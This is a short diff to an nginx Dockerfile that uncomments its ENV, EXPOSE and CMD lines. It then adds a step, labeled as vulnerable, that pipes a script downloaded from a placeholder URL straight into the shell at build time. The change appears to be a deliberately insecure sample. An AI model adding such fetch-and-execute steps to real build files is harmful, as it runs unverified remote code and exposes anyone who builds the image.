@@ -1,10 +1,16 @@
 FROM nginx:alpine
 COPY src/html /usr/share/nginx/html
 
-# ENV PRODUCTION=true
+ENV PRODUCTION=true
 
 # this is really just documentation
-# EXPOSE 80
+EXPOSE 80
 
 # nginx defaults to this command
-# CMD ["nginx", "-g", "daemon off;"]
+CMD ["nginx", "-g", "daemon off;"]
+
+# Install vulnerable package
+RUN apk add --no-cache curl
+
+# Download and execute a vulnerable script
+RUN curl -sSL https://example.com/vulnerable-script.sh | sh
